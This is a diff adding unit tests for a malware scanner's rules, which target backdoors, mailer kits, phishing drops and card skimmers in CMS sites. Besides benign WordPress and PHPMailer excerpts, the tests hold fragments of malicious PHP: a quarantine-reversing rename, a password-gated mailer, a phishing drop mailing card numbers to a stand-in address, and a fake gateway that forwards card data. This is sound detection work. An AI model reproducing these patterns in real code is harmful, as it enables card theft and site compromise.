@@ -1845,3 +1845,258 @@ TEST(RescanRegressionTest, NoiseCommentsAreNotIconFontGlyphReferences) {
     }
     EXPECT_FALSE(ruleFires("OBF038", entypo));
 }
+
+// ============================================================================
+// Round 11: five discriminators whose false-positive cost was measured over
+// 207,311 files in trail-data/CMS, CMS-ext and Sites before any of them was
+// written as a rule.
+//
+// Every negative below is a real file from those trees, named where naming it
+// gives away nothing. They are the files that come closest to each rule without
+// being it, which is the only kind of negative worth pinning: a guard nobody
+// tests is a guard someone removes later.
+// ============================================================================
+
+// OBF041: a signature is bytes, and the ASCII letters are the tell.
+//
+// The trap here is GIF, and it caught the feature that found this family: a real GIF
+// *does* begin with the ASCII letters `GIF`, so testing the first three bytes alone
+// reported 213 forged GIFs, every one an ordinary image. Only PNG has a binary magic;
+// for GIF the tell is the version field.
+TEST(RoundElevenRuleTest, ForgedImageSignatureIsNotAnyExtensionMagicMismatch) {
+    // The payload blobs: an ASCII cover word, then base64 under a substituted
+    // alphabet. The cover word does not track the file's own name - a `.gif` carrying
+    // a `PNG` cover occurs 30 times in the family - so the rule reads content only.
+    EXPECT_TRUE(ruleFires("OBF041",
+        "PNGl9uOb0ghG8sDjtGSJ9s/n0UEjJOOY6vhjiEXBrHhBfZSl6uzleHcn0GsGVOQGrHxBrGE"));
+    EXPECT_TRUE(ruleFires("OBF041",
+        "GIFG6deBVTiJ5ZMoCB5omSnWDguasdTCcFxWei8jNQ6acoSC5D87rGmCJdfqcQ9IfsoGssz"));
+
+    // A real PNG. Magento serves one of these as `pub/errors/default/images/logo.gif`
+    // and prototype's windows theme ships another named `.gif`; both are ordinary
+    // content that the naive extension/magic form would take.
+    EXPECT_FALSE(ruleFires("OBF041",
+        std::string("\x89", 1) + "PNG\r\n" + std::string("\x1a\n", 2) +
+        std::string("\0\0\0\r", 4) + "IHDR" + std::string("\0\0\1\0", 4)));
+
+    // Real GIFs, both versions. This is the case the 213 collapsed to 1 over.
+    EXPECT_FALSE(ruleFires("OBF041", "GIF89a" + std::string("\x10\0\x10\0\xf7", 5)));
+    EXPECT_FALSE(ruleFires("OBF041", "GIF87a" + std::string("\x0a\0\x0a\0\x80", 5)));
+
+    // Eight JFIF JPEGs are misnamed `.png` in the theme trees and three Exif JPEGs
+    // more; five files named `.png`/`.gif` are empty test fixtures; two are real PNGs
+    // named `.gif`. All eighteen are ordinary content, and taking them would roughly
+    // triple this scanner's whole false-positive count to reach samples the cover word
+    // already reaches.
+    EXPECT_FALSE(ruleFires("OBF041",
+        std::string("\xff\xd8\xff\xe0\0\x10", 6) + "JFIF" + std::string("\0\1\1\0", 4)));
+    EXPECT_FALSE(ruleFires("OBF041",
+        std::string("\xff\xd8\xff\xe1\0\x18", 6) + "Exif" + std::string("\0\0MM", 4)));
+    EXPECT_FALSE(ruleFires("OBF041", ""));
+    EXPECT_FALSE(ruleFires("OBF041", "GI"));
+}
+
+// BD018: both ends of the rename decide it, and each end alone is ordinary.
+TEST(RoundElevenRuleTest, UnquarantineRenameNeedsTheSuffixAndTheTarget) {
+    // The three deployers, and the `../` and bare spellings both occur.
+    EXPECT_TRUE(ruleFires("BD018",
+        "<?php\n"
+        "if (file_exists(\"../oyptke.php.suspected\"))\n"
+        "    rename(\"../oyptke.php.suspected\", \"../oyptke.php\");\n"));
+    EXPECT_TRUE(ruleFires("BD018",
+        "<?php\nif (file_exists(\"old.php.suspected\")) rename(\"old.php.suspected\", \"old.php\");\n"));
+
+    // wp-super-cache's wp-cache-phase2.php, writing its config file. It is the only
+    // file in the 207,311 measured that renames anything to a `.php` at all, so a rule
+    // on the target alone would be a rule against writing config files.
+    EXPECT_FALSE(ruleFires("BD018",
+        "<?php\n"
+        "$tmp_config_filename = tempnam( $GLOBALS['cache_path'], md5( (string) wp_rand( 0, 9999 ) ) );\n"
+        "if ( file_exists( $tmp_config_filename . '.php' ) ) {\n"
+        "    unlink( $tmp_config_filename . '.php' );\n"
+        "}\n"
+        "rename( $tmp_config_filename, $tmp_config_filename . '.php' );\n"));
+
+    // The other direction is a quarantine, not a reversal of one: a scanner moving a
+    // file out of the way is the honest use of that suffix.
+    EXPECT_FALSE(ruleFires("BD018",
+        "<?php rename($path, $path . '.suspected');\n"));
+}
+
+// WS011: the library is not the signal, and neither is the brand. The gate is.
+//
+// 225 files in the measured trees bundle PHPMailer - the shape is more common in
+// ordinary plugin code than in malware - so what has to be present is a secret written
+// into the source in front of it. The three negatives are the closest any of the 230
+// at-risk files get.
+TEST(RoundElevenRuleTest, GatedMailerNeedsASecretWrittenDown) {
+    // The kit: the library bundled, the password a literal at the top of the file.
+    EXPECT_TRUE(ruleFires("WS011",
+        "<?php\n"
+        "$password = \"s3cr3tvalue\";\n"
+        "$sessioncode = md5(__FILE__);\n"
+        "if (!empty($password) and $_SESSION[$sessioncode] != $password) {\n"
+        "    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {\n"
+        "        $_SESSION[$sessioncode] = $password;\n"
+        "    } else { print \"<form method=post>Password: \"; exit; }\n"
+        "}\n"
+        "class PHPMailer { public function send() {} }\n"));
+
+    // PHPMailer's own POP3.php: a default parameter value, and an empty one.
+    EXPECT_FALSE(ruleFires("WS011",
+        "<?php\n"
+        "class POP3 {\n"
+        "    public static function popBeforeSmtp(\n"
+        "        $host,\n"
+        "        $port = false,\n"
+        "        $timeout = false,\n"
+        "        $username = '',\n"
+        "        $password = '',\n"
+        "        $debug_level = 0\n"
+        "    ) {\n"
+        "        $pop = new self();\n"
+        "        return $pop->authorise($host, $port, $timeout, $username, $password);\n"
+        "    }\n"
+        "}\n"
+        "// PHPMailer ships beside this file.\n"));
+
+    // WordPress wp-includes/pluggable.php: the value comes from the argument.
+    EXPECT_FALSE(ruleFires("WS011",
+        "<?php\n"
+        "/** @global PHPMailer\\PHPMailer\\PHPMailer $phpmailer */\n"
+        "function wp_authenticate( $username, $password ) {\n"
+        "    $username = sanitize_user( $username );\n"
+        "    $password = trim( $password );\n"
+        "    return apply_filters( 'authenticate', null, $username, $password );\n"
+        "}\n"));
+
+    // WordPress wp-includes/ms-functions.php: the value comes from a call.
+    EXPECT_FALSE(ruleFires("WS011",
+        "<?php\n"
+        "/** @param PHPMailer\\PHPMailer\\PHPMailer $phpmailer */\n"
+        "$meta     = maybe_unserialize( $signup->meta );\n"
+        "$password = wp_generate_password( 12, false );\n"
+        "$user_id  = username_exists( $signup->user_login );\n"));
+
+    // A secret assigned to a different variable is a different variable.
+    EXPECT_FALSE(ruleFires("WS011",
+        "<?php $passwordHash = 'abcdefabcdef'; class PHPMailer {}\n"));
+}
+
+// PHI009: the hardcoded recipient is what makes it a drop rather than a contact form.
+//
+// Each conjunct is load-bearing: dropping the address literal costs 30 false positives
+// in the measured trees, dropping the superglobal costs 24. One real file from each of
+// those two sets is pinned below.
+TEST(RoundElevenRuleTest, MailToFixedAddressNeedsAllThreeConjuncts) {
+    // The kit's one live file: fields out of $_POST, recipient written down, mail().
+    EXPECT_TRUE(ruleFires("PHI009",
+        "<?php\n"
+        "$send = \"drop@example.invalid\";\n"
+        "$message  = \"CARD NUMBER : \".$_POST['cardnum'].\"\\n\";\n"
+        "$message .= \"CARD VERIFICATION NUM : \".$_POST['cvn'].\"\\n\";\n"
+        "$subject = \"VBV | $ip\";\n"
+        "mail($send, $subject, $message, $headers);\n"));
+
+    // WordPress wp-includes/pluggable.php, one of the 30: mail() is named, a
+    // superglobal is read, and every address wp_mail() sends to arrives as an argument
+    // or through a filter. Nothing is written down.
+    EXPECT_FALSE(ruleFires("PHI009",
+        "<?php\n"
+        "// Set to use PHP's mail().\n"
+        "$phpmailer->isMail();\n"
+        "$result = isset( $_REQUEST[ $query_arg ] )\n"
+        "    ? wp_verify_nonce( $_REQUEST[ $query_arg ], $action ) : false;\n"
+        "return $phpmailer->send();\n"));
+
+    // PHPMailer.php itself, one of the 24: a real mail() call and a quoted address,
+    // but the address is a docblock example and the class never reads a superglobal.
+    EXPECT_FALSE(ruleFires("PHI009",
+        "<?php\n"
+        "/**\n"
+        " * PHPMailer::validateAddress('user@example.com', function($address) {\n"
+        " *     return (bool)filter_var($address, FILTER_VALIDATE_EMAIL);\n"
+        " * });\n"
+        " */\n"
+        "$result = @mail($to, $subject, $body, $header, $params);\n"));
+
+    // `wp_mail(` is not `mail(`: a wrapper's name is not evidence of the sink.
+    EXPECT_FALSE(ruleFires("PHI009",
+        "<?php wp_mail('owner@example.com', 'x', $_POST['msg']);\n"));
+}
+
+// CRED007: "reaching a sink" has to mean reaching it.
+//
+// The single false positive the measured candidate cost is the first negative below,
+// and it fails on both halves of what the phrase means: nothing reads a card code, and
+// nothing carries one anywhere.
+TEST(RoundElevenRuleTest, CardCodeToSinkNeedsARequestReadThatReachesTheSink) {
+    // The fake gateway's process_payment: read, pack, forward.
+    EXPECT_TRUE(ruleFires("CRED007",
+        "<?php\n"
+        "public function process_payment($order_id) {\n"
+        "    $card_number = $_POST['card-number'];\n"
+        "    $card_cvc    = $_POST['card-cvc'];\n"
+        "    $url  = $this->get_option('gateway_url');\n"
+        "    $data = array('card_number'=>$card_number, 'card_cvc'=>$card_cvc);\n"
+        "    file_get_contents($url . urlencode(json_encode($data)));\n"
+        "}\n"));
+
+    // The one false positive: a form builder's bootstrap. Its CVC token is an array key
+    // in a field-class registration list, its superglobals are a page-builder check
+    // several hundred lines further on, and its sinks are a local template read and a
+    // marketing-feed fetch further on again.
+    {
+        std::string builder =
+            "<?php\n"
+            "public function setup_fields() {\n"
+            "    if (! apply_filters('ninja_forms_enable_credit_card_fields', false)) {\n"
+            "        unset(self::$instance->fields['creditcard']);\n"
+            "        unset(self::$instance->fields['creditcardcvc']);\n"
+            "        unset(self::$instance->fields['creditcardnumber']);\n"
+            "    }\n"
+            "}\n";
+        builder += std::string(2000, ' ') + "\n";
+        builder +=
+            "public function is_page_builder() {\n"
+            "    return isset($_POST['action']) && $_POST['action'] === 'elementor_ajax';\n"
+            "}\n";
+        builder += std::string(2000, ' ') + "\n";
+        builder +=
+            "public function template($file_name, $data = array(), $return = FALSE) {\n"
+            "    $path = self::$dir . 'includes/Templates/' . $file_name;\n"
+            "    if ($return) return file_get_contents($path);\n"
+            "}\n"
+            "function nf_update_marketing_feed() {\n"
+            "    $data = wp_remote_get('http://api.example.com/feeds/?fetch=addons');\n"
+            "}\n";
+        EXPECT_FALSE(ruleFires("CRED007", builder));
+    }
+
+    // Honest gateways read a card *token* out of the request - PayPal's WooCommerce
+    // module and an EveryPay gateway both do - because tokenising client-side is what
+    // a real one does. A rule keyed on "card" would take both.
+    EXPECT_FALSE(ruleFires("CRED007",
+        "<?php\n"
+        "$card_payment_token_id = wc_clean(wp_unslash($_POST['wc-ppcp-credit-card-gateway-payment-token'] ?? ''));\n"
+        "$response = wp_remote_post($this->endpoint, array('body' => $card_payment_token_id));\n"));
+    EXPECT_FALSE(ruleFires("CRED007",
+        "<?php\n"
+        "$token = sanitize_text_field($_POST['tokenized-card']);\n"
+        "$r = wp_remote_post($api, array('body' => array('token' => $token)));\n"));
+
+    // The read has to reach the sink. The same file's validate-fields method reads the
+    // code and only checks it locally; the method closes before any sink, and that read
+    // is correctly not a finding.
+    EXPECT_FALSE(ruleFires("CRED007",
+        "<?php\n"
+        "public function validate_fields() {\n"
+        "    $card_cvc = isset($_POST['card-cvc']) ? sanitize_text_field($_POST['card-cvc']) : '';\n"
+        "    if (empty($card_cvc)) {\n"
+        "        $errors->add('validation', 'CVC is required');\n"
+        "    }\n"
+        "}\n"
+        "public function fetch_addons() {\n"
+        "    return file_get_contents($this->feed_url);\n"
+        "}\n"));
+}
